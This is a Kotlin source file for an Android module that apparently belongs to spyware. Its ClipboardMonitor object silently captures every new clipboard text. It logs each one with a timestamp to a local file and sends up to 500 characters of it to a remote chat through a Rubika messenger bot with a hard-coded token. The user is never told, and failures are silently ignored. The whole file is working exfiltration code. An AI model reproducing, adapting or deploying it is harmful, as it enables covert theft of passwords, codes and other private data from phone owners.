package com.sys.svc.helpers

import android.content.ClipboardManager
import android.content.Context
import com.sys.svc.BotConfig
import com.sys.svc.Logger
import com.sys.svc.Prefs
import com.sys.svc.RubikaApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object ClipboardMonitor {
    @Volatile private var last: String? = null
    @Volatile private var listener: ClipboardManager.OnPrimaryClipChangedListener? = null
    @Volatile private var enabled = false
    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    fun start(ctx: Context) {
        if (enabled) return
        enabled = true
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val appCtx = ctx.applicationContext
        val l = ClipboardManager.OnPrimaryClipChangedListener {
            try {
                val clip = cm.primaryClip ?: return@OnPrimaryClipChangedListener
                val t = clip.getItemAt(0)?.text?.toString() ?: return@OnPrimaryClipChangedListener
                if (t.isBlank() || t == last) return@OnPrimaryClipChangedListener
                last = t
                val logFile = File(appCtx.filesDir, "clipboard.log")
                logFile.appendText("${fmt.format(Date())} $t\n")
                val chat = Prefs.getChat(appCtx)
                if (!chat.isNullOrEmpty()) {
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            RubikaApi(BotConfig.TOKEN).sendMessage(
                                chat,
                                "📋 ${t.take(500)}"
                            )
                        } catch (_: Exception) {}
                    }
                }
            } catch (e: Exception) {
                Logger.w("Clip", "${e.message}")
            }
        }
        listener = l
        try { cm.addPrimaryClipChangedListener(l) } catch (e: Exception) {
            Logger.w("Clip", "add: ${e.message}")
        }
        Logger.i("Clip", "monitor started")
    }

    fun stop() {
        if (!enabled) return
        enabled = false
        Logger.i("Clip", "monitor stopped")
    }
}